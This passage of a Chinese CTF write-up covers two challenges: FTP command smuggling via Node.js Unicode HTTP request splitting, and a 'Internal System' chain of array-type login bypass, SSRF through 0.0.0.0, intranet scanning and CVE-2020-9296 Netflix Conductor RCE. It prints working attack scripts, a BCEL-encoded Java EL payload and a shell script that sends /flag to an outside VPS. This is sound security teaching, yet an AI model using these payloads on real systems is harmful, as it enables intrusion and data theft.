构造 FTP 命令：

    
    
    USER anonymous
    PASS 
    CWD files
    TYPE I
    PORT 47,101,57,72,0,2000
    RETR flag
    

编写攻击脚本，并现在自己 VPS 上面测试：

    
    
    import requests
    import json
    
    url = "http://node.mrctf.fun:23000/"
    
    ftp_payload = ''' HTTP/1.1
    
    USER anonymous
    PASS 
    CWD files
    TYPE I
    PORT 47,101,57,72,0,2000
    RETR flag
    test:'''.replace("\n","\r\n")
    
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}
    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0x0100+ord(i))
        return ret
    
    ftp_payload = payload_encode(ftp_payload)
    print(ftp_payload)
    
    json_data2 = {
        "url":"http://47.101.57.72:8899/"+ftp_payload    # 通过这里的url值进行SSRF
    }
    
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
    

![](https://p5.ssl.qhimg.com/t0173877c9480f0c224.png)

VPS 上面成功接收到了 FTP 命令，下面开始正式攻击，首先在自己 VPS 上监听 2000 端口等待 FTP 服务器的主动连接并用于后续的文件传输：

![](https://p2.ssl.qhimg.com/t0117524ae3ea13202b.png)

然后执行攻击脚本：

    
    
    import requests
    import json
    
    url = "http://node.mrctf.fun:23000/"
    
    ftp_payload = ''' HTTP/1.1
    
    USER anonymous
    PASS 
    CWD files
    TYPE I
    PORT 47,101,57,72,0,2000
    RETR flag
    test:'''.replace("\n","\r\n")
    
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}
    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0x0100+ord(i))
        return ret
    
    ftp_payload = payload_encode(ftp_payload)
    print(ftp_payload)
    
    json_data2 = {
        "url":"http://ftp:8899/"+ftp_payload    # 通过这里的url值进行SSRF
    }
    
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
    

成功得到flag：

![](https://p5.ssl.qhimg.com/t0197459400bce5bf1b.png)

## [2021 虎符杯 CTF]Internal System

进入题目，是一个很炫酷的登录页面：

![](https://p2.ssl.qhimg.com/t017a0d442dc50e610c.png)

访问 /source 路由得到源码：

    
    
    const express = require('express')
    const router = express.Router()
    
    const axios = require('axios')
    
    const isIp = require('is-ip')
    const IP = require('ip')
    
    const UrlParse = require('url-parse')
    
    const {sha256, hint} = require('./utils')
    
    const salt = 'nooooooooodejssssssssss8_issssss_beeeeest'
    
    const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin'))    // 计算 admin 的哈希
    
    const port = process.env.PORT || 3000    // 这个 NodeJS 服务默认是开在 3000 端口
    
    function formatResopnse(response) {
      if(typeof(response) !== typeof('')) {
        return JSON.stringify(response)    // 如果 response 不等于空, 则将其转换为 JSON 的格式并返回
      } else {
        return response
      }
    }
    
    function SSRF_WAF(url) {
      const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')    // 将 hostname 中的 [ ] 替换为空
    
      return isIp(host) && IP.isPublic(host)    // hostname必须是ip, 并且如果是公网IP则返回true, 防止 SSRF
    }
    
    function FLAG_WAF(url) {
      const pathname = new UrlParse(url).pathname    // pathname 中不能有/flag
      return !pathname.startsWith('/flag')
    }
    
    function OTHER_WAF(url) {
      return true;
    }
    
    const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]
    
    router.get('/', (req, res, next) => {
      if(req.session.admin === undefined || req.session.admin === null) {    // 如果没设置 session.admin 则返回登录页面
        res.redirect('/login')
      } else {
        res.redirect('/index')
      }
    })
    
    router.get('/login', (req, res, next) => {
      const {username, password} = req.query;
    
      if(!username || !password || username === password || username.length === password.length || username === 'admin') {
        res.render('login')    // 主要判断是否输入，以及所输入的用户名和密码是否一致，以及用户名是否为 admin，如果是的话，直接拦截
      } else {    // 可以设 username=['admin']&password=admin 绕过
        const hash = sha256(sha256(salt + username) + sha256(salt + password))
    
        req.session.admin = hash === adminHash    // session.admin 等于 "hash === adminHash" 的判断结果
    
        res.redirect('/index')    // 重定向到 /index 路由
      }
    })
    
    router.get('/index', (req, res, next) => {
      if(req.session.admin === undefined || req.session.admin === null) {
        res.redirect('/login')
      } else {
        res.render('index', {admin: req.session.admin, network: JSON.stringify(require('os').networkInterfaces())})
      }
    })
    
    router.get('/proxy', async(req, res, next) => {
      if(!req.session.admin) {    // 必须用admin访问
        return res.redirect('/index')
      }
      const url = decodeURI(req.query.url);    // 进行一次 URL 解码
    
      console.log(url)
    
      const status = WAF_LISTS.map((waf)=>waf(url)).reduce((a,b)=>a&&b)
    
      if(!status) {    // status 必须为 true
        res.render('base', {title: 'WAF', content: "Here is the waf..."})
      } else {
        try {
          const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`)
          res.render('base', response.data)
        } catch(error) {
          res.render('base', error.message)
        }
      }
    })
    
    router.post('/proxy', async(req, res, next) => {
      if(!req.session.admin) {    // // 必须用admin访问
        return res.redirect('/index')
      }
      // test url
      // not implemented here
      const url = "https://postman-echo.com/post"
      await axios.post(`http://127.0.0.1:${port}/search?url=${url}`)
      res.render('base', "Something needs to be implemented")
    })
    
    
    router.all('/search', async (req, res, next) => {
      if(!/127\.0\.0\.1/.test(req.ip)){    // 必须要匹配到 127.0.0.1, 即必须在本地访问 /search 这个路由
        return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
      }
    
      const result = {title: 'Search Success', content: ''}
    
      const method = req.method.toLowerCase()    // 请求方式
      const url = decodeURI(req.query.url)    // 再进行二次 URL 解码
      const data = req.body
    
      try {
        if(method == 'get') {
          const response = await axios.get(url)
          result.content = formatResopnse(response.data)
        } else if(method == 'post') {
          const response = await axios.post(url, data)
          result.content = formatResopnse(response.data)
        } else {
          result.title = 'Error'
          result.content = 'Unsupported Method'
        }
      } catch(error) {
        result.title = 'Error'
        result.content = error.message
      }
    
      return res.json(result)
    })
    
    router.get('/source', (req, res, next)=>{
      res.sendFile( __dirname + "/" + "index.js");
    })
    
    router.get('/flag', (req, res, next) => {
      if(!/127\.0\.0\.1/.test(req.ip)){    // 必须要匹配到 127.0.0.1, 即必须在本地访问 /flag 这个路由
        return res.send({title: 'Error', content: 'No Flag For You!'})
      }
      return res.json({hint: hint})
    })
    
    module.exports = router
    

代码逻辑比较简单，不做过多描述。

首先我们要做的是登录，登录的处理逻辑：

    
    
    router.get('/login', (req, res, next) => {
      const {username, password} = req.query;
    
      if(!username || !password || username === password || username.length === password.length || username === 'admin') { // 主要判断是否输入，以及所输入的用户名和密码是否一致，以及用户名是否为 admin，如果是的话，直接拦截
        res.render('login')
      } else {
        const hash = sha256(sha256(salt + username) + sha256(salt + password)) // 组合成 hash
    
        req.session.admin = hash === adminHash // 与管理员 hash 比较，对上了就给 session 里这个东西赋值真
    
        res.redirect('/index')
      }
    })
    

这里用到了 JavaScript 弱类型的特性。即 JavaScript 的数组在使用加号拼接的时候最终还是会得到一个字符串（string），于是不会影响
sha256 的处理：

![](https://p5.ssl.qhimg.com/t014467506180ab2b79.png)

看完之后你可能就明白了，我们如下构造 Payload 即可绕过：

    
    
    /login?username[]=admin&password=admin
    

登录绕过后，就能成功以管理员身份进入，并来到以下页面：

![](https://p2.ssl.qhimg.com/t01d15115a104d99f32.png)

这是一个代理器页面，通过这个页面我们可以直接访问到外网的页面：

![](https://p4.ssl.qhimg.com/t018ea9f1a87e1ae3a6.png)

接下来就是有趣的 SSRF 了……

首先，这里提交的 URL 会调用 `GET /proxy` 接口，再来看源码：

    
    
    ......
    
    function SSRF_WAF(url) {
      const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')    // 将 hostname 中的 [ ] 替换为空
    
      return isIp(host) && IP.isPublic(host)    // hostname必须是ip, 并且如果是公网IP则返回true, 防止 SSRF
    }
    
    function FLAG_WAF(url) {
      const pathname = new UrlParse(url).pathname    // pathname 中不能有/flag
      return !pathname.startsWith('/flag')
    }
    
    function OTHER_WAF(url) {
      return true;
    }
    
    const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]
    
    ......
    
    router.get('/proxy', async(req, res, next) => {
      if(!req.session.admin) {    // 必须用admin访问
        return res.redirect('/index')
      }
      const url = decodeURI(req.query.url);    // 进行一次 url 解码
    
      console.log(url)
    
      const status = WAF_LISTS.map((waf)=>waf(url)).reduce((a,b)=>a&&b)
    
      if(!status) {    // status 必须为 true
        res.render('base', {title: 'WAF', content: "Here is the waf..."})
      } else {
        try {
          const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`)
          res.render('base', response.data)
        } catch(error) {
          res.render('base', error.message)
        }
      }
    })
    
    router.post('/proxy', async(req, res, next) => {
      if(!req.session.admin) {    // // 必须用admin访问
        return res.redirect('/index')
      }
      // test url
      // not implemented here
      const url = "https://postman-echo.com/post"
      await axios.post(`http://127.0.0.1:${port}/search?url=${url}`)
      res.render('base', "Something needs to be implemented")
    })
    

这里前面几个 WAF 对 /proxy 路由做了限制，要求输入的 URL Host 为 IP 且为公网 IP，且目录不以 `/flag`
开头。那么就要想办法绕过一下，最简单的办法，就是尝试一下
0.0.0.0，请求时如果用这个地址，会默认访问到本机上。只要是本机监听的端口，都会被请求到。由于这个 NodeJS 服务默认是开在 3000
端口，所以我们输入 `http://0.0.0.0:3000`，成功了：

![](https://p0.ssl.qhimg.com/t01f11169084495b7d2.png)

那我们便可以成功进行 SSRF 了，像那些只限制本地访问的接口，比如 /search，就能访问了。并且，由于题目对 /search
路由做的限制仅限于从本地访问，那我们的思路便是通过 /proxy 代理路由去访问一些真从从本地访问的路由，比如 /search 路由，然后通过这个
/search 路由去进行 SSRF 去访问 /flag 路由：

    
    
    /proxy?url=http://0.0.0.0:3000/search?url=http://127.0.0.1:3000/flag
    

![](https://p0.ssl.qhimg.com/t014e57e14c454f4d4c.png)

如上图所示，成功访问 /flag 路由，并得到了 Hint：

    
    
    {"title":"Search Success","content":"{\"hint\":\"someone else also deploy a netflix conductor server in Intranet?\"}"}
    

提示我们在内网中有部署了一个 Netflix Conductor Server。Netflix Conductor 是 Netflix
开发的一款工作流编排的引擎，在 2.25.3 及以下版本中存在一个任意代码执行（CVE-2020-9296）。漏洞成因在于自定义约束冲突时的错误信息支持了
Java EL 表达式，而且这部分错误信息是攻击者可控的，所以攻击者可以通过注入 Java EL 表达式进行任意代码执行。

那么既然要利用该漏洞就要先在内网中找到这个 Netflix Conductor Server，网上找到它的默认端口为
8080，那么我们来探测一下内网，找一下哪台机器是那个服务器：

    
    
    /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.41.9:8080
    /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.41.10:8080
    /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.41.11:8080
    ......
    /proxy?url=http://0.0.0.0:3000/search?url=http://10.0.41.14:8080
    

在测试到 10.0.41.14 的时候有了回应：

![](https://p0.ssl.qhimg.com/t01dc750dde390c5fdf.png)

是个 Swagger UI，也就是 Netflix Conductor 的文档页，后面就是 Netflix Conductor Server
了。目标找到了，就是这个 10.0.41.14。下面我们就开始尝试利用 Netflix Conductor
的那个漏洞，具体的利用过程请看：<https://xz.aliyun.com/t/7889#toc-2> 。

Netflix Conductor 的这个漏洞出在 `/api/metadata/taskdefs` 上，需要 POST 一个 JSON
过去，里面含有恶意的 BCEL 编码，可以造成 RCE。

那我们首先得准备 BCEL 编码。我们先在本地创建一个恶意的 Evil.java：

    
    
    public class Evil
    {
        public Evil() {
            try {
                Runtime.getRuntime().exec("wget http://47.xxx.xxx.72:2333/shell.txt -O /tmp/shell");
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    
        public static void main(final String[] array) {
        }
    }
    

shell.txt 位于我们的 VPS 上，里面的内容为：

    
    
    #!/bin/sh
    wget http://47.101.57.72:2333/?a=`cat /flag|base64`
    

然后使用 `javac` 将 Evil.java 编译，然后再使用
[BCELCodeman](https://github.com/f1tz/BCELCodeman) 这个工具将其转换为 BCEL 编码：

    
    
    javac Evil.java    // 编译Evil.java
    java -jar BCELCodeman.jar e Evil.class    // 转换为 BCEL 编码
    

![](https://p1.ssl.qhimg.com/t016f6e481ca7872354.png)

然后把它给组合到攻击 Netflix Conductor 所使用的 Json 里：

    
    
    [{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5dO$gA$U$3d$b3$m$L$eb$o$a0$FE$ab$85$f6$a1K$9b$ee$W$d1$90$a8$f1$c5$d8$t$fc$88$98$f6$a1$_$5d$b6$T$Y$ba$y$9be$a0$fc$a3$3e$fbb$8d$P$fe$80$fe$a8$ea$9d$d5$88$89N2g$e6$9e$7b$e6$dc$3b3$ff$fe_$df$A$d8$c2$3b$Di$bc2PD$v$8de$b5$ae$e8$u$h$98$c3$aa$8e5$j$af$ZR$7b$o$Qr$9f$na$d5$be2$q$P$86$3f9C$ae$r$C$7e$3c$ktxt$eev$7cb$b2m$e9z$bf$8e$dc0$8e$e3$d3e$92$P$5c$R0$94$ac$ef$ad$be$3bq$j$df$N$baN$5bF$o$e8$ee$w$3b$a3$3d$iG$k$ff$o$94E$e6p$o$7c$5b$e9Ld$60$e8X7$b1$817$M$db$bf$bb$5cVzR$86$3b$8e$b3$d5$b4$eb$9f$eb$f6v$d3nn$eel6$g$Ng$d4$e3$beo$cb$a9$ac$7c$3a$a98r$Q$de3$s$w$a82$y$cd$K$lN$3d$kJ1$ML$bc$85A$dd$a9$82$M$f9$99$e2$a4$d3$e7$9ed$u$cc$a8$b3q$m$c5$80$da3$a8$89$c7$a0h$d5Z$cf4$bbd$c9$a7$dccxo$bdp$df$t$d4i4$f4$f8hD$Hr$n$re$fcx$e7$91$ebqT$a1$d3$a7$a8$a1$81$a9w$m$9c$a7$e8$H$c5$g$ad$a5$P$7f$c1$ae$a0$z$s$$$91$fc$f6$H$e9$d6$c7K$a4$$H$95D$Wy$fa$3b$N$s$e9V$91$oL$Q$3bG$7c$862$3a$K$e4$5c$q$c7$ye$f2$d0n$J$98$8e$F$F$b9d$ac$v$3cT$x$d3dj$5e$c4$he$98$8a$89$y$e1b$dc$dc$d2$j$b6$ba$u$fcG$C$A$A').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
    

最后就是我们攻击 Netflix Conductor 所使用的 POST 请求了：

    
    
    POST /search?url=http://10.0.99.14:8080/api/metadata/taskdefs HTTP/1.1
    Host: 127.0.0.1:3000
    Content-Type: application/json
    Content-Length:1535
    
    [{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5dO$gA$U$3d$b3$m$L$eb$o$a0$FE$ab$85$f6$a1K$9b$ee$W$d1$90$a8$f1$c5$d8$t$fc$88$98$f6$a1$_$5d$b6$T$Y$ba$y$9be$a0$fc$a3$3e$fbb$8d$P$fe$80$fe$a8$ea$9d$d5$88$89N2g$e6$9e$7b$e6$dc$3b3$ff$fe_$df$A$d8$c2$3b$Di$bc2PD$v$8de$b5$ae$e8$u$h$98$c3$aa$8e5$j$af$ZR$7b$o$Qr$9f$na$d5$be2$q$P$86$3f9C$ae$r$C$7e$3c$ktxt$eev$7cb$b2m$e9z$bf$8e$dc0$8e$e3$d3e$92$P$5c$R0$94$ac$ef$ad$be$3bq$j$df$N$baN$5bF$o$e8$ee$w$3b$a3$3d$iG$k$ff$o$94E$e6p$o$7c$5b$e9Ld$60$e8X7$b1$817$M$db$bf$bb$5cVzR$86$3b$8e$b3$d5$b4$eb$9f$eb$f6v$d3nn$eel6$g$Ng$d4$e3$beo$cb$a9$ac$7c$3a$a98r$Q$de3$s$w$a82$y$cd$K$lN$3d$kJ1$ML$bc$85A$dd$a9$82$M$f9$99$e2$a4$d3$e7$9ed$u$cc$a8$b3q$m$c5$80$da3$a8$89$c7$a0h$d5Z$cf4$bbd$c9$a7$dccxo$bdp$df$t$d4i4$f4$f8hD$Hr$n$re$fcx$e7$91$ebqT$a1$d3$a7$a8$a1$81$a9w$m$9c$a7$e8$H$c5$g$ad$a5$P$7f$c1$ae$a0$z$s$$$91$fc$f6$H$e9$d6$c7K$a4$$H$95D$Wy$fa$3b$N$s$e9V$91$oL$Q$3bG$7c$862$3a$K$e4$5c$q$c7$ye$f2$d0n$J$98$8e$F$F$b9d$ac$v$3cT$x$d3dj$5e$c4$he$98$8a$89$y$e1b$dc$dc$d2$j$b6$ba$u$fcG$C$A$A').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
    

接下来要考虑的就是使用前文所讲的利用 Nodejs Unicode 进行 HTTP 拆分攻击来将这个 POST 请求发送出去了。

首先编写如下脚本生成符合 NodeJS 8 HTTP 拆分攻击要求的 Payload：

    
    
    payload = ''' HTTP/1.1
    
    POST /search?url=http://10.0.99.14:8080/api/metadata/taskdefs HTTP/1.1
    Host: 127.0.0.1:3000
    Content-Type: application/json
    Content-Length:1535
    
    [{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5dO$gA$U$3d$b3$m$L$eb$o$a0$FE$ab$85$f6$a1K$9b$ee$W$d1$90$a8$f1$c5$d8$t$fc$88$98$f6$a1$_$5d$b6$T$Y$ba$y$9be$a0$fc$a3$3e$fbb$8d$P$fe$80$fe$a8$ea$9d$d5$88$89N2g$e6$9e$7b$e6$dc$3b3$ff$fe_$df$A$d8$c2$3b$Di$bc2PD$v$8de$b5$ae$e8$u$h$98$c3$aa$8e5$j$af$ZR$7b$o$Qr$9f$na$d5$be2$q$P$86$3f9C$ae$r$C$7e$3c$ktxt$eev$7cb$b2m$e9z$bf$8e$dc0$8e$e3$d3e$92$P$5c$R0$94$ac$ef$ad$be$3bq$j$df$N$baN$5bF$o$e8$ee$w$3b$a3$3d$iG$k$ff$o$94E$e6p$o$7c$5b$e9Ld$60$e8X7$b1$817$M$db$bf$bb$5cVzR$86$3b$8e$b3$d5$b4$eb$9f$eb$f6v$d3nn$eel6$g$Ng$d4$e3$beo$cb$a9$ac$7c$3a$a98r$Q$de3$s$w$a82$y$cd$K$lN$3d$kJ1$ML$bc$85A$dd$a9$82$M$f9$99$e2$a4$d3$e7$9ed$u$cc$a8$b3q$m$c5$80$da3$a8$89$c7$a0h$d5Z$cf4$bbd$c9$a7$dccxo$bdp$df$t$d4i4$f4$f8hD$Hr$n$re$fcx$e7$91$ebqT$a1$d3$a7$a8$a1$81$a9w$m$9c$a7$e8$H$c5$g$ad$a5$P$7f$c1$ae$a0$z$s$$$91$fc$f6$H$e9$d6$c7K$a4$$H$95D$Wy$fa$3b$N$s$e9V$91$oL$Q$3bG$7c$862$3a$K$e4$5c$q$c7$ye$f2$d0n$J$98$8e$F$F$b9d$ac$v$3cT$x$d3dj$5e$c4$he$98$8a$89$y$e1b$dc$dc$d2$j$b6$ba$u$fcG$C$A$A').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
    
    GET / HTTP/1.1
    test:'''.replace("\n","\r\n")
    
    payload = payload.replace('\r\n', '\u010d\u010a') \
        .replace('+', '\u012b') \
        .replace(' ', '\u0120') \
        .replace('[', '\u015b') \
        .replace(']', '\u015d') \
        .replace('`', '\u0127') \
        .replace('"', '\u0122') \
        .replace("'", '\u0a27') \
        .replace('{', '\u017b') \
        .replace('}', '\u017d')
    
    print(payload)
    
    # 输出: ĠHTTP/1.1čĊčĊPOSTĠ/search?url=http://10.0.99.14:8080/api/metadata/taskdefsĠHTTP/1.1čĊHost:Ġ127.0.0.1:3000čĊContent-Type:Ġapplication/jsončĊContent-Length:1535čĊčĊśŻĢnameĢ:Ģ$Żਧ1ਧ.getClass().forName(ਧcom.sun.org.apache.bcel.internal.util.ClassLoaderਧ).newInstance().loadClass(ਧ$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$5dO$gA$U$3d$b3$m$L$eb$o$a0$FE$ab$85$f6$a1K$9b$ee$W$d1$90$a8$f1$c5$d8$t$fc$88$98$f6$a1$_$5d$b6$T$Y$ba$y$9be$a0$fc$a3$3e$fbb$8d$P$fe$80$fe$a8$ea$9d$d5$88$89N2g$e6$9e$7b$e6$dc$3b3$ff$fe_$df$A$d8$c2$3b$Di$bc2PD$v$8de$b5$ae$e8$u$h$98$c3$aa$8e5$j$af$ZR$7b$o$Qr$9f$na$d5$be2$q$P$86$3f9C$ae$r$C$7e$3c$ktxt$eev$7cb$b2m$e9z$bf$8e$dc0$8e$e3$d3e$92$P$5c$R0$94$ac$ef$ad$be$3bq$j$df$N$baN$5bF$o$e8$ee$w$3b$a3$3d$iG$k$ff$o$94E$e6p$o$7c$5b$e9Ld$60$e8X7$b1$817$M$db$bf$bb$5cVzR$86$3b$8e$b3$d5$b4$eb$9f$eb$f6v$d3nn$eel6$g$Ng$d4$e3$beo$cb$a9$ac$7c$3a$a98r$Q$de3$s$w$a82$y$cd$K$lN$3d$kJ1$ML$bc$85A$dd$a9$82$M$f9$99$e2$a4$d3$e7$9ed$u$cc$a8$b3q$m$c5$80$da3$a8$89$c7$a0h$d5Z$cf4$bbd$c9$a7$dccxo$bdp$df$t$d4i4$f4$f8hD$Hr$n$re$fcx$e7$91$ebqT$a1$d3$a7$a8$a1$81$a9w$m$9c$a7$e8$H$c5$g$ad$a5$P$7f$c1$ae$a0$z$s$$$91$fc$f6$H$e9$d6$c7K$a4$$H$95D$Wy$fa$3b$N$s$e9V$91$oL$Q$3bG$7c$862$3a$K$e4$5c$q$c7$ye$f2$d0n$J$98$8e$F$F$b9d$ac$v$3cT$x$d3dj$5e$c4$he$98$8a$89$y$e1b$dc$dc$d2$j$b6$ba$u$fcG$C$A$Aਧ).newInstance().classŽĢ,ĢownerEmailĢ:Ģtest@example.orgĢ,ĢretryCountĢ:Ģ3Ģ,ĢtimeoutSecondsĢ:Ģ1200Ģ,ĢinputKeysĢ:śĢsourceRequestIdĢ,ĢqcElementTypeĢŝ,ĢoutputKeysĢ:śĢstateĢ,ĢskippedĢ,ĢresultĢŝ,ĢtimeoutPolicyĢ:ĢTIME_OUT_WFĢ,ĢretryLogicĢ:ĢFIXEDĢ,ĢretryDelaySecondsĢ:Ģ600Ģ,ĢresponseTimeoutSecondsĢ:Ģ3600Ģ,ĢconcurrentExecLimitĢ:Ģ100Ģ,ĢrateLimitFrequencyInSecondsĢ:Ģ60Ģ,ĢrateLimitPerFrequencyĢ:Ģ50Ģ,ĢisolationgroupIdĢ:ĢmyIsolationGroupIdĢŽŝčĊčĊGETĠ/ĠHTTP/1.1čĊtest:
    

然后需要将上面生成的 Payload 进行三次 URL 编码，因为我们的 GET 请求会解码一次，进入 /proxy 路由又会解码一次，最后进行
/search 路由进行攻击又会解码一次。

先来测试一下，在自己 VPS 上开个监听 3000 端口，然后执行：

    
    
    /proxy?url=http://47.101.57.72:3000/%2525C4%2525A0HTTP%25252F1.1%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0%25252Fsearch%25253Furl%25253Dhttp%25253A%25252F%25252F10.0.99.14%25253A8080%25252Fapi%25252Fmetadata%25252Ftaskdefs%......T%2525C4%2525A0%25252F%2525C4%2525A0HTTP%25252F1.1%2525C4%25258D%2525C4%25258Atest%25253A
    

![](https://p0.ssl.qhimg.com/t01175fc5da09abedd9.png)

如上图所示，成功发送了一个POST请求，也就是我们的攻击请求。

先在自己的 VPS 上存在 shell.txt 的目录中用 Python 开启一个 HTTP 服务：

![](https://p4.ssl.qhimg.com/t01ab5693c7ba3bb574.png)

然后执行 Payload：

    
    
    /proxy?url=http://0.0.0.0:3000/%2525C4%2525A0HTTP%25252F1.1%2525C4%25258D%2525C4%25258A%2525C4%25258D%2525C4%25258APOST%2525C4%2525A0%25252Fsearch%25253Furl%25253Dhttp%25253A%25252F%25252F10.0.99.14%25253A8080%25252Fapi%25252Fmetadata%25252Ftaskdefs%......T%2525C4%2525A0%25252F%2525C4%2525A0HTTP%25252F1.1%2525C4%25258D%2525C4%25258Atest%25253A
    

![](https://p4.ssl.qhimg.com/t01c2e383562530c7a2.png)

如上图所示，成功控制目标主机下载了我们的 shell.txt 文件，然后再次编写一个 Evil.java 用于执行刚才下载下来的 shell.txt 文件：

    
    
    public class Evil
    {
        public Evil() {
            try {
                Runtime.getRuntime().exec("sh /tmp/shell");
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    
        public static void main(final String[] array) {
        }
    }
    

重新编译，重新编码，重新构造并发送 Payload：

![](https://p5.ssl.qhimg.com/t014aee1cfffb2d9c84.png)

如上图所示，成功执行了 /tmp/shell 并带出了经过 base64 编码后的 flag：

![](https://p0.ssl.qhimg.com/t015ee6ad41eaaa9448.png)

## Ending……

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WHOAMI** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/241429](/post/id/241429)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __4赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=HN3c2Tzia2RGtxxlcskYgyw&s=40&t=1575959591)
WHOAMI

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

